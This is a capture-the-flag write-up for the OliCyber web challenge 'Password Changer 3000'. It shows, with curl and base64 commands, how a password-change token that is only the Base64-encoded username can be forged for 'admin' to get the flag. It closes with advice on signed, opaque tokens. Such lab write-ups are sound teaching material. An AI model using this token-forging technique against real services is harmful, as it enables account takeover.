# Password Changer 3000

**Competition:** OliCyber<br>
**Category:** Web<br>
**URL:** http://password-changer.challs.olicyber.it

---

## Description

> Can you change the password of the "admin" user?

A web application that allows you to change passwords via a token. The token is vulnerable.

---

## Solution

### Step 1 — Initial Analysis

Let's make a POST request to the home with any user to understand how the site works:

```bash
curl -v -X POST http://password-changer.challs.olicyber.it \
  -d "username=test" 2>&1 | grep -E "Location|302"
```

The server responds with a **302 Found** and redirects us to:

```
change-password.php?token=dGVzdA==
```

---

### Step 2 — Token Decoding

Let's immediately decode the token to understand what it contains:

```bash
echo "dGVzdA==" | base64 -d
```

**Output:**
```
test
```

The token is simply the username in plaintext, encoded in **Base64**.

---

### Step 3 — Vulnerability Identification

The site blindly trusts the token value to identify the user and no signature, no secret. Anyone can forge an arbitrary token simply by Base64-encoding the desired username.

This is a classic case of **Insecure Direct Object Reference (IDOR)** combined with blind trust in client-controllable data.

---

### Step 4 — Constructing the token for admin

Let's construct the token for `admin`:

```bash
echo -n "admin" | base64
```

**Output:**
```
YWRtaW4=
```

---

### Step 5 — Exploit

We directly visit `change-password.php` with the forged token:

```bash
curl "http://password-changer.challs.olicyber.it/change-password.php?token=YWRtaW4="
```

The response contains the flag of the `admin` user.

---

## Conclusions

> Base64 is **not encryption**: it's just encoding, reversible by anyone.

A secure token must be:

- **Signed** (e.g., HMAC) to guarantee integrity
- **Opaque** (e.g., random UUID server-side) to avoid exposing user information
- **Non-predictable** and not derivable from public information like username

The vulnerability exploited is an **IDOR (Insecure Direct Object Reference)** facilitated by the use of Base64 as a means of "protection", a false sense of security that provides no cryptographic guarantee.